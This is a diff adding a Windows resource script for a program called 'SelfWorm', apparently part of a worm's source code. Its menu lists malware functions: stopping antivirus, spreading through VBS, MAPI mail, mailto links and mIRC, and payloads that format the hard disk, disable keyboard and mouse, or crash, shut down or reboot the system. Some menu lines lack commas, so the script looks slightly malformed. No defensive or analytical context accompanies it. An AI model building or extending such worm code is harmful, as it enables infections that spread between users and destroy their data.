@@ -1,0 +1,39 @@
+#include "SelfWorm.h"
+#include <C:\Borland\BCC55\Include\windows.h>
+#include <C:\Borland\BCC55\Include\winver.h>
+
+SELFWORM ICON  DISCARDABLE "SELFWORM.ICO"
+
+SELFWORM MENU DISCARDABLE 
+BEGIN
+    POPUP "&Main"   
+    BEGIN
+        MENUITEM "Stop AV",     IDM_STOPAV
+        MENUITEM "Quit",        IDM_EXIT
+    END
+
+    POPUP "&Spread"
+    BEGIN
+        MENUITEM "VBS Spread",      IDM_VBSSPREAD
+        MENUITEM "MAPIReadMail"     IDM_READMAIL
+        MENUITEM "mailto:"      IDM_MAILTO
+        MENUITEM "mIRC",        IDM_MIRC
+    END
+
+    POPUP "&Payload"
+    BEGIN
+        MENUITEM "Format HD"        IDM_FORMAT
+        MENUITEM "Disable Keyboard and Mouse"   IDM_DISABLE
+        MENUITEM "Shutdown system"  IDM_STOP
+        MENUITEM "Reboot system"    IDM_REBOOT
+        MENUITEM "Crash system"     IDM_CRASH
+    END     
+        
+
+    POPUP "A&bout"
+    BEGIN
+        MENUITEM "You",         IDM_ABOUTU
+        MENUITEM "Work",        IDM_ABOUT
+    END
+
+END
